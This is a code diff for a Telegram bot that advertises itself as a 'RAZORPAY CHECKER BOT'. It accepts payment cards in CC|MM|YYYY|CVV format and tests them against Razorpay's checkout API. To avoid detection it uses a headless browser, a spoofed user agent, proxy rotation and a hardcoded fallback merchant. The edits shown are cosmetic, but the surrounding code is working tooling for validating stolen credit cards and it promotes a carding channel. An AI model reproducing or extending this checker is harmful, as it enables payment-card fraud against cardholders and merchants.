@@ -38,9 +38,6 @@ except ImportError:
 # ─── RAILWAY VARIABLES ─────────────────────────────────────
 BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
 ADMIN_IDS = [int(x.strip()) for x in os.getenv('ADMIN_IDS', '123456789').split(',')]
-DEFAULT_AMOUNT = os.getenv('DEFAULT_AMOUNT', 'random')
-DEFAULT_CURRENCY = os.getenv('DEFAULT_CURRENCY', 'USD')
-DEFAULT_SITE = os.getenv('DEFAULT_SITE', '')
 
 # ─── LOGGING ───────────────────────────────────────────────
 logging.basicConfig(
@@ -49,7 +46,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# ─── CONSTANTS ─────────────────────────────────────────────
+# ─── CONSTANTS (SAME AS ORIGINAL SCRIPT) ──────────────────
 USD_TO_INR_RATE = 83.50
 AMOUNT_MIN = 1
 AMOUNT_MAX = 100
@@ -63,7 +60,7 @@ FALLBACK_MERCHANT = {
     'payment_page_item_id': 'ppi_OzLkvSvf1drPpt'
 }
 
-# ─── PROXY MANAGER ─────────────────────────────────────────
+# ─── PROXY MANAGER (FROM ORIGINAL) ────────────────────────
 class ProxyManager:
     def __init__(self):
         self.proxies = []
@@ -95,7 +92,7 @@ class ProxyManager:
             return {"server": f"http://{ip}:{port}"}
         return None
 
-# ─── RAZORPAY CHECKER ──────────────────────────────────────
+# ─── RAZORPAY CHECKER (SAME AS ORIGINAL) ──────────────────
 class RazorpayChecker:
     def __init__(self, proxy_manager=None, site_url=None):
         self.proxy_manager = proxy_manager
@@ -127,9 +124,7 @@ class RazorpayChecker:
                 browser_args = ['--no-sandbox', '--disable-dev-shm-usage']
                 browser = p.chromium.launch(headless=True, proxy=proxy_config, args=browser_args)
                 page = browser.new_page()
-                page.set_extra_http_headers({
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-                })
+                page.set_extra_http_headers({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
                 page.goto(self.site_url, timeout=45000, wait_until='networkidle')
                 merchant_data = page.evaluate("""
                     () => {
@@ -176,9 +171,7 @@ class RazorpayChecker:
                 browser_args = ['--no-sandbox', '--disable-dev-shm-usage']
                 browser = p.chromium.launch(headless=True, proxy=proxy_config, args=browser_args)
                 page = browser.new_page()
-                page.set_extra_http_headers({
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-                })
+                page.set_extra_http_headers({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
                 initial_url = "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1"
                 page.goto(initial_url, timeout=30000)
                 page.wait_for_url("**/checkout/public*session_token*", timeout=25000)
@@ -425,8 +418,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🔥 *RAZORPAY CHECKER BOT* 🔥\n\n"
         "💳 Check cards using Razorpay API\n"
         "📌 Custom amounts supported\n"
-        "🔄 Proxy rotation enabled\n"
-        "🌐 Dynamic merchant extraction\n\n"
+        "🔄 Proxy rotation enabled\n\n"
         "📢 Channel: @dlxdropp",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode="Markdown"
@@ -588,8 +580,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("❌ Invalid format. Use: `CC|MM|YYYY|CVV`", parse_mode="Markdown")
             return
         
-        amount = context.user_data.get('amount', os.getenv('DEFAULT_AMOUNT', 'random'))
-        currency = context.user_data.get('currency', os.getenv('DEFAULT_CURRENCY', 'USD'))
+        amount = context.user_data.get('amount', 'random')
+        currency = context.user_data.get('currency', 'USD')
         proxy = context.user_data.get('proxy')
         site = context.user_data.get('site')
         
@@ -617,8 +609,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("❌ No valid cards found!", parse_mode="Markdown")
             return
         
-        amount = context.user_data.get('amount', os.getenv('DEFAULT_AMOUNT', 'random'))
-        currency = context.user_data.get('currency', os.getenv('DEFAULT_CURRENCY', 'USD'))
+        amount = context.user_data.get('amount', 'random')
+        currency = context.user_data.get('currency', 'USD')
         proxy = context.user_data.get('proxy')
         site = context.user_data.get('site')
         
@@ -671,7 +663,7 @@ def main():
     app.add_handler(CallbackQueryHandler(handle_curr_selection, pattern="curr_usdt"))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
-    logger.info("🔥 Checker Bot is running on Railway!")
+    logger.info("🔥 Checker Bot is running!")
     app.run_polling()
 
 if __name__ == "__main__":
